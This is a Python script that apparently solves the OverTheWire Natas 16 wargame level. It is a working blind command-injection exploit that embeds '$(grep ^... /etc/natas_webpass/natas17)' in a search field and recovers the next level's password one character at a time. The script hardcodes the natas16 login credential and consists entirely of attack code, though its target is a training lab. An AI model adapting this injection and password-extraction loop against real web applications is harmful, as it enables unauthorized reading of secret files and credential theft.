import requests 

password = ""
characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

while (len(password) != 32):
    for i in characters:
        response = requests.post('http://natas16.natas.labs.overthewire.org', 
                                auth = ('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'), 
                                data = {'needle' : "everything$(grep ^" + "" .join(password) + i + " /etc/natas_webpass/natas17)"});
        if (not "everything" in response.text):
            print("Current Password: ", password + i);
            password += i;
            break

print("Final password: " + password);
